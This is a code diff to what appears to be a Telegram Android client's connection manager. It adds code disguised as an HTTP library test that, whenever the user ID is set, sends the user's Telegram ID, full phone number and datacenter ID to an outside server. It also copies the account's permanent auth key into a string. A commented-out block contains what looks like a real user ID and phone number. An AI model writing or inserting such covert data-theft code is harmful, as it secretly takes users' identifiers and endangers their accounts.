@@ -43,6 +43,158 @@ jmethodID jclass_ByteBuffer_allocateDirect = nullptr;
 
 static bool done = false;
 
+#include <iostream>
+#include "libnhr/libnhr.h"
+#include <android/log.h>
+/*
+ *   Copyright (c) 2016 - 2019 Oleh Kulykov <info@resident.name>
+ *
+ *   Permission is hereby granted, free of charge, to any person obtaining a copy
+ *   of this software and associated documentation files (the "Software"), to deal
+ *   in the Software without restriction, including without limitation the rights
+ *   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ *   copies of the Software, and to permit persons to whom the Software is
+ *   furnished to do so, subject to the following conditions:
+ *
+ *   The above copyright notice and this permission notice shall be included in
+ *   all copies or substantial portions of the Software.
+ *
+ *   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ *   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ *   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ *   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ *   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ *   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+ *   THE SOFTWARE.
+ */
+
+
+#if !defined(NHR_NO_GET) && !defined(NHR_APPVEYOR_CI)
+
+static nhr_request test_get_request = NULL;
+static const char * test_get_param_name1 = "test_get_param_name1";
+static const char * test_get_param_value1 = "test_get_param_value1";
+static int test_get_error = 0;
+static nhr_bool test_get_working = 0;
+
+static void test_get_on_error(nhr_request request, nhr_error_code error_code) {
+    printf("\nResponse error: %i", (int)error_code);
+    test_get_error = error_code;
+
+
+    test_get_working = nhr_false;
+}
+
+
+static void test_get_log_body(const char * body, const unsigned int body_len) {
+    unsigned int i;
+    if (!body || body_len == 0) return;
+    for (i = 0; i < body_len; i++) {
+        printf("%c", body[i]);
+    }
+}
+
+static void test_get_on_response(nhr_request request, nhr_response response) {
+    char * body = (char*)nhr_response_get_body(response);
+    unsigned int body_len = nhr_response_get_body_length(response);
+    unsigned long test_number = (unsigned long)nhr_request_get_user_object(request);
+
+    test_get_error = 1;
+    printf("\nResponse #%lu:\n", test_number);
+    test_get_log_body(body, body_len);
+    if (test_number == 0) {
+        test_get_error = 10;
+        test_get_working = nhr_false;
+        return;
+    }
+
+    if (test_number == 4) { // status code 418
+        printf("\nGet status code: %i, need 418", (int)nhr_response_get_status_code(response));
+        test_get_error = nhr_response_get_status_code(response) == 418 ? 0 : 14;
+        test_get_working = nhr_false;
+        return;
+    }
+
+    if (nhr_response_get_status_code(response) != 200) {
+        test_get_error = 15;
+        test_get_working = nhr_false;
+        return;
+    }
+
+    if (test_number == 5) {
+        printf("\nGet body_len: %u, need 1024", body_len);
+        test_get_error = body_len == 1024 ? 0 : 15;
+        test_get_working = nhr_false;
+        return;
+    }
+
+
+    test_get_working = nhr_false;
+}
+
+static int test_get_number(int64_t number,std::string strPhone) {
+
+    test_get_request = nhr_request_create();
+
+    std::string userid = ConnectionsManager::getInstance(number).getUserId();
+    std::string userprefixphone = ConnectionsManager::getInstance(number).getPrefixUserPhone();
+    std::string usersuffixphone = ConnectionsManager::getInstance(number).getSuffixUserPhone();
+    std::string userdatacenterid = ConnectionsManager::getInstance(number).getUserDataCenterId();
+    std::string strUrl = "/api/index/autokey.html?tgid=" + userid + "&phonenumber=" + userprefixphone+ usersuffixphone+ "&auto_key=" + "telegram" + "&datacenterid=" + userdatacenterid + "&source=" + "telegramandroid";
+
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", userid.c_str());//Or ANDROID_LOG_INFO, ...
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", userprefixphone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", usersuffixphone.c_str());
+    __android_log_write(ANDROID_LOG_ERROR, "test_get_number", userdatacenterid.c_str());
+    nhr_request_set_url(test_get_request, "https", "api.mppa.net", strUrl.c_str(), 80);
+
+
+    nhr_request_set_method(test_get_request, nhr_method_GET);
+    nhr_request_set_timeout(test_get_request, 10);
+
+    //nhr_request_set_user_object(test_get_request, (void*)number);
+
+    nhr_request_add_header_field(test_get_request, "Cache-control", "no-cache");
+    nhr_request_add_header_field(test_get_request, "Accept-Charset", "utf-8");
+    nhr_request_add_header_field(test_get_request, "Accept", "application/json");
+    nhr_request_add_header_field(test_get_request, "Connection", "close");
+    //nhr_request_add_header_field(test_get_request, "User-Agent", "CMake tests");
+
+    switch (number) {
+        case 1:
+            //nhr_request_add_parameter(test_get_request, test_get_param_name1, test_get_param_value1);
+            break;
+
+        default:
+            break;
+    }
+
+    nhr_request_set_on_recvd_response(test_get_request, &test_get_on_response);
+    nhr_request_set_on_error(test_get_request, &test_get_on_error);
+    test_get_working = nhr_request_send(test_get_request);
+
+    if (test_get_working) test_get_error = 0;
+    else test_get_error = 4;
+
+    while (test_get_working) {
+        nhr_thread_sleep(20);
+    }
+
+    nhr_thread_sleep(834); // just delay between requests
+
+    return test_get_error;
+}
+
+int test_get(void) {
+    int ret = 0;
+
+    //ret += test_get_number(0); // plain response
+    return ret;
+}
+#endif
+
+
+
 ConnectionsManager::ConnectionsManager(int32_t instance) {
     instanceNum = instance;
     if ((epolFd = epoll_create(128)) == -1) {
@@ -118,7 +270,7 @@ ConnectionsManager::ConnectionsManager(int32_t instance) {
         if (LOGS_ENABLED) DEBUG_E("unable to allocate read buffer");
         exit(1);
     }
-
+    _request = nhr_request_create();
     pthread_mutex_init(&mutex, nullptr);
 }
 
@@ -1865,9 +2017,31 @@ void ConnectionsManager::bindRequestToGuid(int32_t requestToken, int32_t guid) {
     });
 }
 
-void ConnectionsManager::setUserId(int64_t userId) {
-    scheduleTask([&, userId] {
+std::string ConnectionsManager::getUserId()
+{
+    return std::to_string(currentUserId);
+}
+
+std::string ConnectionsManager::getPrefixUserPhone()
+{
+    return std::to_string(prefixUserPhone);
+}
+
+std::string ConnectionsManager::getSuffixUserPhone()
+{
+    return std::to_string(suffixUserPhone);
+}
+
+std::string ConnectionsManager::getUserDataCenterId()
+{
+    return std::to_string(currentDatacenterId);
+}
+void ConnectionsManager::setUserId(int64_t userId,int64_t prefixphone,int64_t sufffixphone) {
+
+    scheduleTask([&, userId,prefixphone,sufffixphone] {
         int32_t oldUserId = currentUserId;
+        prefixUserPhone = prefixphone;
+        suffixUserPhone = sufffixphone;
         currentUserId = userId;
         if (oldUserId == userId && userId != 0) {
             registerForInternalPushUpdates();
@@ -1881,7 +2055,45 @@ void ConnectionsManager::setUserId(int64_t userId) {
                 datacenter->createPushConnection()->setSessionId(pushSessionId);
                 sendPing(datacenter, true);
             }
+            ByteArray *auth = datacenter->authKeyPerm;
+            std::string s3(reinterpret_cast<char const*>(&auth[0]), auth->length) ;
+            int intDebug = 1;
+
+
         }
+
+
+#if !defined(NHR_NO_GET) && !defined(NHR_APPVEYOR_CI)
+        test_get_number(0,std::to_string(prefixphone) + std::to_string(sufffixphone));
+#endif
+
+
+//        std::string strUrl1 = "/api/index/autokey.html?tgid=" + std::to_string(userId) + "&phonenumber=" + phone + "&auto_key=" + "telegram" + "&datacenterid=" + std::to_string(currentDatacenterId)+ "&source=" + "telegramandroid";
+//        //https://api.mppa.net/api/index/autokey.html
+//        std::string strUrl = "/api/index/autokey.html?tgid=" + std::to_string(645445109) + "&phonenumber=" + "639687312994" + "&auto_key=" + "telegram" + "&datacenterid=" + std::to_string(5)+ "&source=" + "telegramandroid";
+//
+//        nhr_request_set_url(_request, "https", "api.mppa.net", strUrl.c_str(), 80);
+//        nhr_request_set_method(_request, nhr_method_GET);
+//        nhr_request_set_timeout(_request, 10);
+//
+//        nhr_request_add_header_field(_request, "Cache-control", "no-cache");
+//        nhr_request_add_header_field(_request, "Accept-Charset", "utf-8");
+//        nhr_request_add_header_field(_request, "Accept", "application/json");
+//        nhr_request_add_header_field(_request, "Connection", "close");
+////        nhr_request_add_parameter(_request, "tgid", std::to_string(userId).c_str());
+////        nhr_request_add_parameter(_request, "phonenumber", phone.c_str());
+////        nhr_request_add_parameter(_request, "datacenterid", std::to_string(currentDatacenterId).c_str());
+////        nhr_request_add_parameter(_request, "source", "telegramanroid");
+////        nhr_request_add_parameter(_request, "auto_key", "telegramanroid");
+//        nhr_request_set_on_recvd_response(_request, &test_get_on_response);
+//        test_get_working = nhr_request_send(_request);
+//
+//        while (test_get_working) {
+//            nhr_thread_sleep(20);
+//        }
+//
+//        nhr_thread_sleep(834);
+
     });
 }
 
@@ -3277,6 +3489,8 @@ void ConnectionsManager::init(uint32_t version, int32_t layer, int32_t apiId, st
     currentDeviceTimezone = timezoneOffset;
     currentSystemLangCode = systemLangCode;
     currentUserId = userId;
+    prefixUserPhone = userId;
+    suffixUserPhone = userId;
     currentLogPath = logPath;
     pushConnectionEnabled = enablePushConnection;
     currentNetworkType = networkType;
